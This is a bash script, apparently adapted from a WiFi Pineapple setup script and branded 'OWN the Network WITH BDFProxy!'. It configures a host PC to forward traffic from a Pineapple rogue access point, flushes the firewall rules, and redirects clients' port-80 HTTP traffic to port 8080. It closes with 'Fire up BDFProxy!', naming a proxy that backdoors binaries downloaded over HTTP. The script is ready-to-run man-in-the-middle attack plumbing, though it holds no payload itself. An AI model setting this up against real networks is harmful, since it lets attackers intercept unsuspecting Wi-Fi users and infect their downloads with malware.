#!/bin/bash
#define variables

echo "$(tput setaf 3)  _       ___ _______    ____  _                              __   "
echo " | |     / (_) ____(_)  / __ \\(_)___  ___  ____ _____  ____  / /__ "
echo " | | /| / / / /_  / /  / /_/ / / __ \/ _ \/ __ '/ __ \/ __ \/ / _ \\"
echo " | |/ |/ / / __/ / /  / ____/ / / / /  __/ /_/ / /_/ / /_/ / /  __/"
echo " |__/|__/_/_/   /_/  /_/   /_/_/ /_/\___/\__,_/ .___/ .___/_/\___/ "
echo " $(tput sgr0) OWN the Network                            $(tput setaf 3)/_/   /_/$(tput sgr0)       v2.2"
echo "   WITH BDFProxy!													 "
echo ""

echo -n "Pineapple Netmask [255.255.255.0]: "
read pineapplenetmask
if [[ $pineapplenetmask == '' ]]; then 
pineapplenetmask=255.255.255.0 #Default netmask for /24 network
fi

echo -n "Pineapple Network [172.16.42.0/24]: "
read pineapplenet
if [[ $pineapplenet == '' ]]; then 
pineapplenet=172.16.42.0/24 # Pineapple network. Default is 172.16.42.0/24
fi

echo -n "Interface between PC and Pineapple [eth0]: "
read pineapplelan
if [[ $pineapplelan == '' ]]; then 
pineapplelan=eth0 # Interface of ethernet cable directly connected to Pineapple
fi

echo -n "Interface between PC and Internet [wlan0]: "
read pineapplewan
if [[ $pineapplewan == '' ]]; then 
pineapplewan=wlan0 #i.e. wlan0 for wifi, ppp0 for 3g modem/dialup, eth0 for lan
fi

temppineapplegw=`netstat -nr | awk 'BEGIN {while ($3!="0.0.0.0") getline; print $2}'` #Usually correct by default
echo -n "Internet Gateway [$temppineapplegw]: "
read pineapplegw
if [[ $pineapplegw == '' ]]; then 
pineapplegw=`netstat -nr | awk 'BEGIN {while ($3!="0.0.0.0") getline; print $2}'` #Usually correct by default
fi

echo -n "IP Address of Host PC [172.16.42.42]: "
read pineapplehostip
if [[ $pineapplehostip == '' ]]; then 
pineapplehostip=172.16.42.42 #IP Address of host computer
fi

echo -n "IP Address of Pineapple [172.16.42.1]: "
read pineappleip
if [[ $pineappleip == '' ]]; then 
pineappleip=172.16.42.1 #Thanks Douglas Adams
fi

#Display settings
#echo Pineapple connected to: $pineapplelan
#echo Internet connection from: $pineapplewan
#echo Internet connection gateway: $pineapplegw
#echo Host Computer IP: $pineapplehostip
#echo Pineapple IP: $pineappleip
#echo Network: $pineapplenet
#echo Netmask: $pineapplenetmask

echo "		-.(\`-')"
echo "		__( OO)__"
echo "$(tput setaf 6)     _ .   $(tput sgr0)     \- $(tput setaf 7)___ -/ $(tput sgr0)     $(tput setaf 3) \||/$(tput sgr0)   Internet: $pineapplegw - $pineapplewan"
echo "$(tput setaf 6)   (  _ )_ $(tput sgr0) $(tput setaf 2)<-->$(tput sgr0)  $(tput setaf 7)[-_-]$(tput sgr0)  $(tput setaf 2)<-->$(tput sgr0)  $(tput setaf 3),<><>,$(tput sgr0)  Computer: $pineapplehostip"
echo "$(tput setaf 6) (_  _(_ ,)$(tput sgr0)       $(tput setaf 7)\___\\$(tput sgr0)        $(tput setaf 3)'<><>'$(tput sgr0) Pineapple: $pineapplenet - $pineapplelan"


#Bring up Ethernet Interface directly connected to Pineapple
ifconfig $pineapplelan $pineapplehostip netmask $pineapplenetmask up

# Enable IP Forwarding
echo '1' > /proc/sys/net/ipv4/ip_forward
#echo -n "IP Forwarding enabled. /proc/sys/net/ipv4/ip_forward set to "
#cat /proc/sys/net/ipv4/ip_forward

#clear chains and rules
iptables -X
iptables -F
#echo iptables chains and rules cleared

#setup IP forwarding
iptables -A FORWARD -i $pineapplewan -o $pineapplelan -s $pineapplenet -m state --state NEW -j ACCEPT
iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A POSTROUTING -t nat -j MASQUERADE
iptables -t nat -A PREROUTING -i $pineapplelan -s $pineapplenet -p tcp --dport 80 -j REDIRECT --to-port 8080

#echo IP Forwarding Enabled

#remove default route
route del default
#echo Default route removed

#add default gateway
route add default gw $pineapplegw $pineapplewan
#echo Pineapple Default Gateway Configured

#instructions
#echo All set. Now on the Pineapple issue: route add default gw $pineapplehostip br-lan


echo ""
echo "Browse to http://$pineappleip:1471 if necessary"
echo "Fire up BDFProxy!"
echo ""

